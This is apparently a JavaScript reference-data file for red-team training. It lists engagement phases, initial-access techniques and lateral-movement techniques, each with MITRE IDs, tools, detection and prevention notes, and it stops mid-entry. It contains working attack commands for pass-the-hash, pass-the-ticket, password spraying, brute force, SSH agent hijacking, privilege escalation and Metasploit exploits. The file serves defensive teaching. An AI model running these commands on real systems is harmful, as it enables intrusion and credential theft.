// =============================================================================
// Red Team Operations Reference Data
// Cybersecurity educational reference for authorized security assessments
// =============================================================================

const RED_TEAM_PHASES = [
  {
    name: 'Planning and Scoping',
    description: 'The planning phase establishes the rules of engagement, scope boundaries, and objectives for the authorized security assessment. This phase involves coordination with stakeholders, legal review, and documentation of all constraints including time windows, target systems, and excluded assets.',
    objectives: [
      'Define scope and boundaries of the engagement',
      'Establish rules of engagement and emergency contacts',
      'Obtain written authorization and legal approvals',
      'Identify target systems, networks, and personnel',
      'Define success criteria and reporting requirements',
      'Set up secure communication channels with the client',
      'Coordinate with blue team or SOC if purple team exercise'
    ],
    tools: [
      'Project management platforms',
      'Secure communication tools (Signal, encrypted email)',
      'Scope documentation templates',
      'Risk assessment frameworks'
    ],
    deliverables: [
      'Signed rules of engagement document',
      'Scope definition document',
      'Emergency contact procedures',
      'Project timeline and milestones',
      'Communication plan'
    ]
  },
  {
    name: 'Reconnaissance',
    description: 'Reconnaissance involves gathering intelligence about the target organization through both passive and active methods. Passive recon collects publicly available information without direct interaction, while active recon involves scanning and probing target infrastructure to map the attack surface.',
    objectives: [
      'Enumerate external-facing assets and services',
      'Identify employee names, roles, and email formats',
      'Discover technology stack and software versions',
      'Map network ranges and DNS infrastructure',
      'Identify third-party relationships and supply chain',
      'Find leaked credentials or sensitive documents',
      'Build target profiles for social engineering'
    ],
    tools: [
      'Shodan', 'Censys', 'Amass', 'Subfinder', 'theHarvester',
      'SpiderFoot', 'Maltego', 'Recon-ng', 'FOCA', 'Nmap',
      'Masscan', 'LinkedIn', 'Google Dorking', 'SecurityTrails',
      'crt.sh', 'Wayback Machine', 'DNSdumpster'
    ],
    deliverables: [
      'Asset inventory and network map',
      'Subdomain enumeration results',
      'Technology stack analysis',
      'Employee and organizational intelligence',
      'Attack surface assessment'
    ]
  },
  {
    name: 'Weaponization',
    description: 'The weaponization phase involves developing or configuring the tools, payloads, and infrastructure needed for the engagement. This includes setting up command-and-control servers, creating phishing templates, and preparing exploits tailored to the target environment.',
    objectives: [
      'Set up command-and-control infrastructure',
      'Configure redirectors and domain fronting',
      'Develop custom payloads for the target environment',
      'Create phishing templates and pretexts',
      'Prepare exploitation tools and scripts',
      'Test payloads against security controls',
      'Establish backup communication channels'
    ],
    tools: [
      'Cobalt Strike', 'Sliver', 'Metasploit Framework',
      'Mythic', 'Havoc', 'GoPhish', 'Evilginx2',
      'msfvenom', 'Donut', 'ScareCrow', 'Nim/Go compilers'
    ],
    deliverables: [
      'Operational C2 infrastructure',
      'Tested payloads and delivery mechanisms',
      'Phishing campaign materials',
      'Infrastructure documentation',
      'Fallback communication plans'
    ]
  },
  {
    name: 'Delivery',
    description: 'Delivery is the phase where the attacker transmits the weaponized payload to the target environment. Common delivery vectors include spear-phishing emails, watering hole attacks, USB drops, and exploitation of external-facing services. The chosen method depends on the target profile and engagement scope.',
    objectives: [
      'Deliver payload to target users or systems',
      'Bypass email security gateways and filters',
      'Evade endpoint detection during delivery',
      'Track delivery success and failure rates',
      'Maintain operational security during delivery',
      'Adapt delivery method based on initial results'
    ],
    tools: [
      'GoPhish', 'King Phisher', 'Custom SMTP servers',
      'Evilginx2', 'Social engineering toolkit (SET)',
      'USB Rubber Ducky', 'LAN Turtle'
    ],
    deliverables: [
      'Delivery campaign metrics and logs',
      'Phishing click-through and credential capture rates',
      'Documentation of delivery vectors used',
      'Timeline of delivery attempts'
    ]
  },
  {
    name: 'Exploitation',
    description: 'The exploitation phase involves leveraging vulnerabilities, misconfigurations, or social engineering to gain initial access to the target environment. This may involve exploiting software vulnerabilities, using harvested credentials, or executing delivered payloads to establish a foothold.',
    objectives: [
      'Gain initial access to the target environment',
      'Establish a reliable foothold on compromised systems',
      'Escalate privileges from standard user to administrator',
      'Identify and exploit misconfigurations',
      'Document all access paths and vulnerabilities used',
      'Minimize detection by security controls'
    ],
    tools: [
      'Metasploit', 'Cobalt Strike', 'Burp Suite',
      'SQLmap', 'Responder', 'mitm6', 'Impacket',
      'CrackMapExec', 'BloodHound', 'PowerView',
      'Certify', 'Rubeus', 'KrbRelayUp'
    ],
    deliverables: [
      'Documented exploitation paths',
      'Evidence of successful access',
      'Vulnerability assessment per exploited flaw',
      'Screenshots and proof artifacts'
    ]
  },
  {
    name: 'Post-Exploitation',
    description: 'Post-exploitation focuses on achieving the engagement objectives after initial access, including lateral movement, privilege escalation, data discovery, and persistence. This phase demonstrates the real-world business impact of the vulnerabilities found during exploitation.',
    objectives: [
      'Move laterally to high-value targets',
      'Escalate to domain administrator or root privileges',
      'Locate and access sensitive data and systems',
      'Establish persistence mechanisms for continued access',
      'Demonstrate business impact of compromise',
      'Exfiltrate sample data as proof of concept',
      'Map the full Active Directory environment',
      'Access critical business systems and databases'
    ],
    tools: [
      'BloodHound', 'Mimikatz', 'Rubeus', 'Impacket',
      'CrackMapExec', 'SharpHound', 'Seatbelt',
      'LaZagne', 'PowerView', 'ADFind', 'PingCastle',
      'Certify', 'Whisker', 'SharpDPAPI'
    ],
    deliverables: [
      'Lateral movement path documentation',
      'Privilege escalation evidence',
      'Data access proof of concept',
      'Attack path diagrams',
      'Business impact assessment'
    ]
  },
  {
    name: 'Reporting',
    description: 'The reporting phase compiles all findings into a comprehensive report that includes an executive summary, technical details, risk ratings, and remediation recommendations. The report serves as the primary deliverable and should be actionable for both technical and non-technical stakeholders.',
    objectives: [
      'Document all findings with evidence and risk ratings',
      'Provide executive summary for leadership',
      'Detail technical attack paths with screenshots',
      'Recommend prioritized remediation actions',
      'Present findings to technical and executive audiences',
      'Provide raw data and artifacts for blue team analysis',
      'Schedule remediation verification testing'
    ],
    tools: [
      'Ghostwriter', 'PlexTrac', 'Dradis',
      'Serpico', 'Custom report templates',
      'Markdown/LaTeX for technical writing',
      'Diagram tools (draw.io, Visio)'
    ],
    deliverables: [
      'Executive summary report',
      'Technical findings report with CVSS scores',
      'Attack narrative with timeline',
      'Remediation roadmap with priorities',
      'Raw evidence archive',
      'Presentation slide deck',
      'Retesting schedule'
    ]
  },
  {
    name: 'Remediation Verification',
    description: 'After the client implements fixes, the red team retests previously identified vulnerabilities to verify that remediation efforts were successful. This phase ensures that patches and configuration changes effectively close the identified attack paths without introducing new issues.',
    objectives: [
      'Verify all critical and high findings are remediated',
      'Confirm patches do not introduce new vulnerabilities',
      'Validate security control improvements',
      'Test detection capabilities for previously used techniques',
      'Provide updated risk assessment'
    ],
    tools: [
      'Same toolset as exploitation phase',
      'Custom verification scripts',
      'Vulnerability scanners for validation'
    ],
    deliverables: [
      'Remediation verification report',
      'Updated risk posture assessment',
      'Residual risk documentation',
      'Final sign-off letter'
    ]
  }
];

const INITIAL_ACCESS_TECHNIQUES = [
  {
    name: 'Spear-Phishing with Macro-Enabled Documents',
    mitreTechnique: 'T1566.001',
    description: 'Attackers craft targeted emails containing Microsoft Office documents with embedded VBA macros. When the victim enables macros, the malicious code executes, typically downloading and running a second-stage payload. Modern variants use template injection to fetch the macro-enabled template from a remote server, bypassing static analysis of the initial document.',
    tools: [
      'GoPhish for campaign management',
      'Microsoft Office for document creation',
      'msfvenom for payload generation',
      'Macro Pack for macro obfuscation'
    ],
    detection: 'Monitor for Office applications spawning child processes (cmd.exe, powershell.exe, wscript.exe). Enable Attack Surface Reduction (ASR) rules in Microsoft Defender. Log and alert on macro execution events via Windows Event ID 4688 with process command line auditing.',
    difficulty: 'Medium'
  },
  {
    name: 'Spear-Phishing with HTA Files',
    mitreTechnique: 'T1566.001',
    description: 'HTML Application (HTA) files execute outside the browser security sandbox using mshta.exe, allowing full system access. Attackers deliver HTA files as email attachments or links that, when opened, execute embedded VBScript or JScript code. HTA files can be disguised with document-like icons and double extensions to deceive users.',
    tools: [
      'mshta.exe (built-in Windows binary)',
      'Custom HTA generators',
      'Nishang Out-HTA',
      'Social Engineering Toolkit (SET)'
    ],
    detection: 'Monitor for mshta.exe execution and its child processes. Alert on mshta.exe loading network resources. Use application whitelisting to block HTA execution. Windows Event ID 4688 will log mshta.exe process creation.',
    difficulty: 'Low'
  },
  {
    name: 'Spear-Phishing with ISO/IMG Containers',
    mitreTechnique: 'T1566.001',
    description: 'ISO and IMG disk image files automatically mount when double-clicked on modern Windows systems. Files inside mounted disk images do not carry Mark-of-the-Web (MOTW), bypassing SmartScreen and Protected View warnings. Attackers embed LNK files or executables inside disk images to achieve code execution without the usual security prompts.',
    tools: [
      'PackMyPayload for container creation',
      'Custom ISO generation scripts',
      'mkisofs / genisoimage for ISO creation'
    ],
    detection: 'Monitor for virtual disk mount events (Windows Event ID 12 for VHD mount). Alert on processes spawned from mounted virtual drives. Block ISO/IMG attachments at the email gateway. Windows 11 22H2+ patches MOTW propagation into ISO files.',
    difficulty: 'Low'
  },
  {
    name: 'Spear-Phishing with OneNote Attachments',
    mitreTechnique: 'T1566.001',
    description: 'Microsoft OneNote files (.one) can embed file attachments that execute when double-clicked by the user. Attackers overlay the embedded file icon with a fake button image prompting the user to click, which triggers execution of the embedded payload. This technique gained popularity in early 2023 as macros became blocked by default in Office.',
    tools: [
      'OneNote for file creation',
      'Custom OneNote payload builders',
      'Social engineering pretexts'
    ],
    detection: 'Monitor for OneNote.exe spawning child processes. Block .one file attachments at the email gateway. Microsoft added embedded file execution warnings in OneNote updates from March 2023 onward.',
    difficulty: 'Low'
  },
  {
    name: 'Drive-by Compromise',
    mitreTechnique: 'T1189',
    description: 'Attackers compromise legitimate websites or purchase advertising space to serve malicious content to visitors. The malicious code exploits browser or plugin vulnerabilities to execute code on the visitor system without user interaction beyond visiting the page. Watering hole attacks target websites frequently visited by employees of the target organization.',
    tools: [
      'Browser Exploitation Framework (BeEF)',
      'Metasploit browser exploit modules',
      'Custom JavaScript exploit kits',
      'Evilginx2 for credential interception'
    ],
    detection: 'Deploy browser isolation solutions. Monitor for unusual browser child processes. Use web proxy logs to identify connections to known malicious domains. Endpoint Detection and Response (EDR) solutions can detect exploit behavior patterns.',
    difficulty: 'High'
  },
  {
    name: 'Exploit Public-Facing Application',
    mitreTechnique: 'T1190',
    description: 'Attackers identify and exploit vulnerabilities in internet-facing applications such as web servers, VPN gateways, email servers, and firewalls. Common targets include unpatched Exchange servers (ProxyShell, ProxyLogon), Citrix ADC (CVE-2023-4966), Fortinet VPN (CVE-2024-21762), and web applications with SQL injection or remote code execution flaws.',
    tools: [
      'Nmap for service enumeration: nmap -sV -sC -p- target',
      'Nuclei for vulnerability scanning: nuclei -u https://target -t cves/',
      'Burp Suite for web application testing',
      'SQLmap for SQL injection: sqlmap -u "http://target/page?id=1" --batch',
      'Metasploit for known CVE exploitation'
    ],
    detection: 'Deploy Web Application Firewalls (WAF) with up-to-date rule sets. Monitor application logs for exploit signatures. Implement vulnerability scanning on a regular cadence. Use intrusion detection systems on the network perimeter.',
    difficulty: 'Medium'
  },
  {
    name: 'Supply Chain Compromise - Software',
    mitreTechnique: 'T1195.002',
    description: 'Attackers compromise the software supply chain by inserting malicious code into legitimate software updates, build pipelines, or dependency packages. The SolarWinds Sunburst attack demonstrated how compromising a single vendor update mechanism can provide access to thousands of downstream organizations. Package manager attacks (npm, PyPI, NuGet) use typosquatting and dependency confusion to distribute malicious packages.',
    tools: [
      'Dependency confusion tools',
      'Package repository analysis',
      'Build pipeline compromise techniques',
      'Code signing certificate theft tools'
    ],
    detection: 'Implement software composition analysis (SCA) tools. Verify package integrity with checksums and signatures. Monitor for unexpected outbound connections from trusted applications. Use private package repositories with approval workflows.',
    difficulty: 'High'
  },
  {
    name: 'Trusted Relationship',
    mitreTechnique: 'T1199',
    description: 'Attackers compromise a third-party organization that has trusted network access or VPN connectivity to the primary target. Managed service providers (MSPs), IT vendors, and business partners often have elevated access to client environments. Compromising one MSP can provide access to hundreds of client networks through existing trust relationships and remote management tools.',
    tools: [
      'Network mapping tools',
      'Remote management tool exploitation',
      'Active Directory trust enumeration: nltest /domain_trusts',
      'BloodHound for trust relationship mapping'
    ],
    detection: 'Monitor and audit third-party access regularly. Implement network segmentation for vendor access. Log all remote management tool activity. Require MFA for all third-party connections.',
    difficulty: 'Medium'
  },
  {
    name: 'Valid Accounts - Domain Accounts',
    mitreTechnique: 'T1078.002',
    description: 'Attackers obtain and use legitimate domain credentials to access the target environment, blending in with normal user activity. Credentials may be obtained through password spraying against exposed services, purchasing from initial access brokers, harvesting from data breaches, or through phishing campaigns that capture credentials. Valid credentials bypass many security controls and generate minimal alerts.',
    tools: [
      'Spray for password spraying: spray -smb target userlist passwordlist',
      'Ruler for Exchange/Outlook attacks',
      'CredMaster for distributed password spraying',
      'Dehashed, Have I Been Pwned for breach data',
      'Evilginx2 for real-time credential phishing'
    ],
    detection: 'Implement account lockout policies with reasonable thresholds. Deploy MFA across all services. Monitor for authentication anomalies (impossible travel, unusual hours). Alert on password spray patterns in authentication logs.',
    difficulty: 'Low'
  },
  {
    name: 'Valid Accounts - Cloud Accounts',
    mitreTechnique: 'T1078.004',
    description: 'Attackers target cloud service accounts (Azure AD, AWS IAM, GCP) through credential theft, token hijacking, or OAuth consent phishing. Cloud accounts often have broad permissions and may lack the same monitoring as on-premises accounts. Compromised cloud identities can provide access to email, file storage, and cloud infrastructure without touching the corporate network.',
    tools: [
      'MSOLSpray for Microsoft 365: Invoke-MSOLSpray -UserList users.txt -Password Pass123',
      'Roadtools for Azure AD enumeration',
      'ScoutSuite for cloud configuration audit',
      'Pacu for AWS post-exploitation',
      'AADInternals for Azure AD attacks'
    ],
    detection: 'Enable Azure AD Identity Protection or AWS GuardDuty. Monitor for OAuth application consent grants. Alert on impossible travel scenarios. Implement conditional access policies requiring MFA and compliant devices.',
    difficulty: 'Medium'
  },
  {
    name: 'External Remote Services',
    mitreTechnique: 'T1133',
    description: 'Attackers exploit externally accessible remote services such as VPN concentrators, RDP gateways, Citrix environments, and SSH servers. These services are designed for legitimate remote access but can be abused with stolen credentials or by exploiting vulnerabilities. Many organizations expose these services directly to the internet, making them prime targets for credential stuffing and brute force attacks.',
    tools: [
      'Nmap for service discovery: nmap -p 3389,22,443,8443 target',
      'Hydra for credential testing: hydra -L users.txt -P pass.txt rdp://target',
      'Crowbar for RDP brute force',
      'Ncrack for network service authentication testing'
    ],
    detection: 'Require MFA on all remote access services. Monitor for brute force patterns in VPN and RDP logs. Implement geographic access restrictions. Deploy network-level authentication (NLA) for RDP.',
    difficulty: 'Low'
  },
  {
    name: 'Hardware Additions',
    mitreTechnique: 'T1200',
    description: 'Physical access attacks involve planting rogue devices such as network implants, USB keystroke injectors, or wireless access points within the target facility. Devices like the LAN Turtle, Bash Bunny, or WiFi Pineapple can provide persistent remote access or capture network traffic. These devices are often disguised as legitimate equipment and can operate undetected for extended periods.',
    tools: [
      'Hak5 LAN Turtle for network implant',
      'Hak5 Bash Bunny for USB attacks',
      'WiFi Pineapple for wireless attacks',
      'USB Rubber Ducky for keystroke injection',
      'Throwing Star LAN Tap for passive capture'
    ],
    detection: 'Implement 802.1X port-based network access control. Conduct regular physical security audits. Monitor for new MAC addresses on switch ports. Use USB device whitelisting via Group Policy. Deploy rogue device detection for wireless networks.',
    difficulty: 'Medium'
  },
  {
    name: 'Phishing for Information - Credential Harvesting',
    mitreTechnique: 'T1598.003',
    description: 'Rather than delivering a payload, this technique focuses on harvesting user credentials through convincing replicas of legitimate login pages. Attackers clone authentication portals for services like Microsoft 365, Okta, or corporate VPNs and host them on look-alike domains. Reverse proxy tools can intercept credentials and session tokens in real time, defeating basic MFA implementations.',
    tools: [
      'Evilginx2 for reverse proxy phishing',
      'GoPhish for campaign management and tracking',
      'Modlishka for reverse proxy credential interception',
      'SocialFish for phishing page generation'
    ],
    detection: 'Deploy phishing-resistant MFA (FIDO2/WebAuthn hardware keys). Monitor for newly registered look-alike domains. Train users to verify URLs before entering credentials. Use email authentication (DMARC, DKIM, SPF) to prevent domain spoofing.',
    difficulty: 'Medium'
  },
  {
    name: 'Content Injection via Search Engine Poisoning',
    mitreTechnique: 'T1608.006',
    description: 'Attackers create malicious websites optimized for search engines to appear in results for queries commonly made by target organization employees. These sites may host exploit kits, credential phishing pages, or trojanized software downloads. SEO poisoning is particularly effective against IT staff searching for tools, documentation, or troubleshooting guides.',
    tools: [
      'SEO analysis tools for keyword research',
      'Web hosting for malicious sites',
      'Browser Exploitation Framework (BeEF)',
      'Custom landing pages with exploit kits'
    ],
    detection: 'Deploy web content filtering and URL reputation services. Use browser isolation for web browsing. Monitor DNS queries for connections to newly registered domains. Educate users about verifying download sources.',
    difficulty: 'Medium'
  },
  {
    name: 'Replication Through Removable Media',
    mitreTechnique: 'T1091',
    description: 'Attackers distribute malicious USB drives in parking lots, lobbies, or common areas of the target organization (USB drop attacks). The drives contain auto-executing payloads or enticing file names that trick users into opening them. This technique bypasses network-based security controls entirely by relying on physical access and user curiosity to achieve code execution on internal systems.',
    tools: [
      'Hak5 USB Rubber Ducky for keystroke injection',
      'Hak5 Bash Bunny for multi-vector USB attacks',
      'BadUSB firmware modifications',
      'Custom autorun payloads'
    ],
    detection: 'Disable USB autorun via Group Policy. Implement USB device whitelisting. Deploy endpoint protection that scans removable media. Monitor for new USB device connections via Windows Event ID 6416.',
    difficulty: 'Low'
  },
  {
    name: 'Exploit Public-Facing Application - Web Shell',
    mitreTechnique: 'T1505.003',
    description: 'After exploiting a vulnerability in a web application, attackers deploy web shells to maintain persistent access through the web server. Web shells are server-side scripts (PHP, ASP, JSP) that provide command execution through HTTP requests, making the traffic blend with normal web traffic. Advanced web shells use encryption, authentication, and fileless techniques to avoid detection.',
    tools: [
      'China Chopper web shell (legacy)',
      'p0wny-shell for PHP environments',
      'ASPXSpy for IIS servers',
      'Weevely for PHP web shell management: weevely generate password shell.php',
      'Behinder for encrypted web shell communication'
    ],
    detection: 'Monitor web server directories for new or modified script files. Use file integrity monitoring (FIM) on web roots. Analyze web server logs for unusual POST requests to script files. Deploy runtime application self-protection (RASP) solutions.',
    difficulty: 'Medium'
  }
];

const LATERAL_MOVEMENT_TECHNIQUES = [
  {
    name: 'PsExec (Impacket)',
    mitreTechnique: 'T1570',
    description: 'PsExec creates a service on the remote host to execute commands via the SMB protocol. The Impacket implementation uploads a service binary, creates and starts the service, and returns output through named pipes. This technique requires local administrator credentials on the target host and generates well-known artifacts including service creation events.',
    commands: [
      'impacket-psexec domain/user:password@target',
      'impacket-psexec -hashes LM:NT domain/user@target',
      'impacket-psexec domain/user:password@target -c local_file.exe',
      'psexec.py -k -no-pass domain/user@target (Kerberos auth)'
    ],
    detection: 'Monitor for Windows Event ID 7045 (new service installation). Alert on the default Impacket service name pattern (random 8 characters). Track SMB file writes to ADMIN$ or C$ shares. Monitor for named pipe creation events.',
    prevention: 'Restrict local administrator account usage across the network. Disable the default admin shares (ADMIN$, C$). Implement LAPS (Local Administrator Password Solution) to randomize local admin passwords. Block SMB traffic between workstations.'
  },
  {
    name: 'WMI (Windows Management Instrumentation)',
    mitreTechnique: 'T1047',
    description: 'WMI provides a built-in mechanism for remote command execution on Windows systems. Attackers use WMI to create processes on remote hosts without writing files to disk, making it more stealthy than PsExec. WMI operates over DCOM (port 135) or WinRM (port 5985/5986) and requires local administrator credentials.',
    commands: [
      'impacket-wmiexec domain/user:password@target',
      'impacket-wmiexec -hashes LM:NT domain/user@target',
      'wmic /node:target process call create "cmd.exe /c whoami"',
      'crackmapexec smb target -u user -p password --exec-method wmiexec -x "whoami"'
    ],
    detection: 'Monitor for WMI process creation events (Windows Event ID 4688 from WmiPrvSE.exe). Enable WMI trace logging. Track DCOM connection events on port 135. Monitor for wmiprvse.exe spawning child processes.',
    prevention: 'Restrict WMI access through DCOM permissions. Disable remote WMI for non-administrative users. Use Windows Firewall to limit DCOM and WMI ports. Monitor and alert on WMI subscription creation.'
  },
  {
    name: 'WinRM (Windows Remote Management)',
    mitreTechnique: 'T1021.006',
    description: 'WinRM is the Microsoft implementation of WS-Management protocol, providing remote shell access to Windows systems over HTTP (5985) or HTTPS (5986). PowerShell Remoting uses WinRM as its transport and is enabled by default on Windows Server. This provides a fully interactive shell and supports constrained language mode bypass techniques.',
    commands: [
      'evil-winrm -i target -u user -p password',
      'evil-winrm -i target -u user -H NT_hash',
      'Enter-PSSession -ComputerName target -Credential domain\\user',
      'Invoke-Command -ComputerName target -ScriptBlock {whoami} -Credential $cred',
      'crackmapexec winrm target -u user -p password -x "whoami"'
    ],
    detection: 'Monitor Windows Event ID 4624 (logon type 3 for network) and Event ID 91 (WSMan session created). Track PowerShell script block logging (Event ID 4104). Monitor network connections to ports 5985/5986.',
    prevention: 'Limit WinRM access to specific source IPs using Windows Firewall rules. Require HTTPS (port 5986) for WinRM connections. Use JEA (Just Enough Administration) to restrict PowerShell Remoting capabilities. Implement network segmentation.'
  },
  {
    name: 'RDP (Remote Desktop Protocol)',
    mitreTechnique: 'T1021.001',
    description: 'RDP provides full graphical desktop access to Windows systems on port 3389. Attackers use RDP for lateral movement because it provides a natural interactive session and blends with legitimate administrative traffic. RDP sessions can be tunneled through other protocols and support restricted admin mode which allows pass-the-hash authentication.',
    commands: [
      'xfreerdp /v:target /u:user /p:password /cert:ignore',
      'xfreerdp /v:target /u:user /pth:NT_hash /cert:ignore (restricted admin)',
      'rdesktop target -u user -p password',
      'SharpRDP.exe computername=target command="cmd.exe /c whoami" username=domain\\user password=pass'
    ],
    detection: 'Monitor Windows Event IDs 4624 (logon type 10 for remote interactive) and 4778/4779 (session reconnect/disconnect). Track RDP connection events in TerminalServices-RemoteConnectionManager log. Alert on RDP connections between workstations.',
    prevention: 'Disable RDP on systems where it is not needed. Require NLA (Network Level Authentication). Use RDP gateways with MFA. Restrict RDP access to specific security groups and source networks.'
  },
  {
    name: 'SMB File Sharing and Admin Shares',
    mitreTechnique: 'T1021.002',
    description: 'SMB shares (particularly default administrative shares ADMIN$, C$, IPC$) enable file transfer and remote administration. Attackers copy tools and payloads to target systems via SMB, then execute them using other techniques such as scheduled tasks or service creation. CrackMapExec automates many SMB-based lateral movement workflows.',
    commands: [
      'crackmapexec smb target -u user -p password --shares',
      'smbclient //target/C$ -U domain/user%password',
      'net use \\\\target\\C$ /user:domain\\user password',
      'copy payload.exe \\\\target\\C$\\Windows\\Temp\\',
      'impacket-smbclient domain/user:password@target'
    ],
    detection: 'Monitor for access to administrative shares (Event ID 5140, 5145). Track file writes to ADMIN$ and C$ shares. Alert on lateral SMB connections between workstations. Monitor for unusual SMB authentication patterns.',
    prevention: 'Disable default administrative shares where possible. Implement SMB signing to prevent relay attacks. Block SMB traffic between workstations at the network level. Use LAPS for unique local admin passwords.'
  },
  {
    name: 'DCOM (Distributed Component Object Model)',
    mitreTechnique: 'T1021.003',
    description: 'DCOM enables remote COM object instantiation and method invocation over the network. Several COM objects can be abused for lateral movement including MMC20.Application, ShellWindows, ShellBrowserWindow, and Excel.Application. DCOM lateral movement is less commonly detected than PsExec or WMI because many organizations do not monitor DCOM activity specifically.',
    commands: [
      'impacket-dcomexec domain/user:password@target',
      'impacket-dcomexec -object MMC20 domain/user:password@target',
      '[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","target")).Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c whoami","Minimized")',
      '$com = [Type]::GetTypeFromCLSID("9BA05972-F6A8-11CF-A442-00A0C90A8F39","target")'
    ],
    detection: 'Monitor for DCOM connection events on port 135. Track process creation from DllHost.exe or svchost.exe with DCOM context. Alert on remote DCOM object instantiation. Enable DCOM audit logging via Component Services.',
    prevention: 'Restrict DCOM access through Windows Firewall rules on port 135. Configure DCOM launch and access permissions. Limit which users can activate DCOM objects remotely. Monitor and restrict COM object access.'
  },
  {
    name: 'SSH Lateral Movement',
    mitreTechnique: 'T1021.004',
    description: 'SSH provides encrypted remote access to Linux and Unix systems on port 22. Attackers use harvested SSH keys, stolen credentials, or agent forwarding to move between systems. SSH agent hijacking allows an attacker to use a legitimate users forwarded SSH agent to authenticate to additional systems without possessing the private key directly.',
    commands: [
      'ssh -i stolen_key user@target',
      'ssh -o ProxyCommand="ssh -W %h:%p pivot_host" user@internal_target',
      'SSH_AUTH_SOCK=/tmp/ssh-XXXX/agent.PID ssh user@target (agent hijacking)',
      'sshpass -p password ssh user@target'
    ],
    detection: 'Monitor SSH authentication logs (/var/log/auth.log, /var/log/secure). Alert on SSH connections from unusual source systems. Track SSH key-based authentication events. Monitor for SSH agent forwarding usage.',
    prevention: 'Disable SSH password authentication in favor of key-based auth. Implement SSH certificate authority for key management. Restrict SSH access with AllowUsers/AllowGroups directives. Disable SSH agent forwarding where not needed.'
  },
  {
    name: 'Pass-the-Hash',
    mitreTechnique: 'T1550.002',
    description: 'Pass-the-hash allows an attacker to authenticate using the NTLM hash of a password without knowing the plaintext password. NTLM authentication uses the hash directly for challenge-response, so possession of the hash is equivalent to knowing the password for authentication purposes. This technique works against any service that accepts NTLM authentication, including SMB, WMI, LDAP, and HTTP.',
    commands: [
      'impacket-psexec -hashes LM:NT domain/user@target',
      'crackmapexec smb target -u user -H NT_hash',
      'evil-winrm -i target -u user -H NT_hash',
      'xfreerdp /v:target /u:user /pth:NT_hash (requires restricted admin mode)',
      'mimikatz: sekurlsa::pth /user:admin /domain:corp /ntlm:hash /run:cmd.exe'
    ],
    detection: 'Monitor for NTLM authentication (Event ID 4624 logon type 3) where the LogonProcess is NtLmSsp. Track authentication patterns for individual accounts. Alert on lateral movement from compromised systems. Implement Windows Credential Guard.',
    prevention: 'Enable Windows Credential Guard to protect LSASS credentials. Implement LAPS for unique local admin passwords. Restrict NTLM authentication using GPO settings. Use privileged access workstations (PAWs) for administrative tasks.'
  },
  {
    name: 'Pass-the-Ticket',
    mitreTechnique: 'T1550.003',
    description: 'Pass-the-ticket involves stealing Kerberos tickets (TGT or service tickets) from one system and injecting them into another session to authenticate as the ticket owner. A stolen TGT allows the attacker to request service tickets for any service the user has access to. This technique does not require the users password or hash, only access to the ticket in memory or on disk.',
    commands: [
      'mimikatz: kerberos::ptt ticket.kirbi',
      'Rubeus.exe ptt /ticket:base64_ticket',
      'impacket-getTGT domain/user:password -dc-ip dc_ip',
      'export KRB5CCNAME=ticket.ccache && impacket-psexec -k -no-pass domain/user@target',
      'Rubeus.exe dump /luid:0x3e4 /service:krbtgt'
    ],
    detection: 'Monitor for Kerberos ticket requests from unusual workstations. Alert on TGT usage from systems where the user has not performed an interactive logon. Track Event ID 4768 (TGT request) and 4769 (service ticket request) for anomalies.',
    prevention: 'Implement Kerberos armoring (FAST). Reduce Kerberos ticket lifetimes. Use group Managed Service Accounts (gMSA) for service accounts. Monitor for and remediate Kerberoasting and AS-REP roasting exposure.'
  },
  {
    name: 'Overpass-the-Hash',
    mitreTechnique: 'T1550.002',
    description: 'Overpass-the-hash (also called pass-the-key) converts an NTLM hash into a Kerberos ticket, allowing the attacker to use Kerberos authentication instead of NTLM. This technique is useful in environments where NTLM is restricted or heavily monitored because it generates legitimate Kerberos traffic. The attacker uses the hash to request a TGT from the domain controller, then uses that TGT for further authentication.',
    commands: [
      'mimikatz: sekurlsa::pth /user:admin /domain:corp.local /ntlm:hash /run:powershell',
      'Rubeus.exe asktgt /user:admin /rc4:hash /ptt',
      'Rubeus.exe asktgt /user:admin /aes256:aes_key /ptt',
      'impacket-getTGT -hashes LM:NT domain/user'
    ],
    detection: 'Monitor for TGT requests (Event ID 4768) using RC4 encryption (0x17) when the environment enforces AES. Alert on Kerberos authentication from workstations where the account has no interactive session. Correlate NTLM authentication artifacts with subsequent Kerberos ticket requests.',
    prevention: 'Enforce AES-only Kerberos encryption across the domain. Implement Credential Guard to prevent hash extraction. Monitor for RC4 Kerberos ticket requests. Use Protected Users security group for privileged accounts.'
  },
  {
    name: 'Token Impersonation',
    mitreTechnique: 'T1134.001',
    description: 'Windows access tokens represent the security context of running processes and can be duplicated or impersonated by attackers with SeImpersonatePrivilege or SeAssignPrimaryTokenPrivilege. Service accounts and IIS application pool identities commonly have these privileges. Potato-family exploits (JuicyPotato, PrintSpoofer, GodPotato) abuse this to escalate from service accounts to SYSTEM.',
    commands: [
      'Incognito: list_tokens -u',
      'Incognito: impersonate_token "DOMAIN\\User"',
      'PrintSpoofer.exe -i -c cmd.exe',
      'GodPotato.exe -cmd "cmd /c whoami"',
      'SharpToken.exe list'
    ],
    detection: 'Monitor for token manipulation API calls (DuplicateToken, ImpersonateLoggedOnUser). Alert on processes running with impersonated tokens. Track Event ID 4624 logon type 9 (NewCredentials). Monitor for privilege escalation from service accounts.',
    prevention: 'Remove SeImpersonatePrivilege from accounts that do not require it. Use Group Managed Service Accounts. Monitor and restrict which accounts have token impersonation privileges. Keep systems patched against potato-family vulnerabilities.'
  },
  {
    name: 'Remote Service Exploitation',
    mitreTechnique: 'T1210',
    description: 'Attackers exploit vulnerabilities in network services running on internal systems to move laterally. Common targets include unpatched SMB services (EternalBlue/MS17-010), RDP vulnerabilities (BlueKeep/CVE-2019-0708), print spooler vulnerabilities (PrintNightmare), and web applications on internal servers. Internal systems are often patched less frequently than external-facing systems.',
    commands: [
      'nmap -sV --script vuln target_range',
      'crackmapexec smb target_range -u "" -p "" --gen-relay-list',
      'Metasploit: use exploit/windows/smb/ms17_010_eternalblue',
      'Metasploit: use exploit/windows/rdp/cve_2019_0708_bluekeep_rce'
    ],
    detection: 'Implement vulnerability scanning on internal networks. Monitor for exploit attempt signatures in network traffic via IDS/IPS. Track patch compliance across all internal systems. Alert on unusual service crashes that may indicate exploitation attempts.',
    prevention: 'Maintain aggressive internal patching cadence. Segment the network to limit blast radius. Deploy host-based IPS on critical servers. Disable unnecessary services on all systems.'
  },
  {
    name: 'Scheduled Task/Job - Remote',
    mitreTechnique: 'T1053.005',
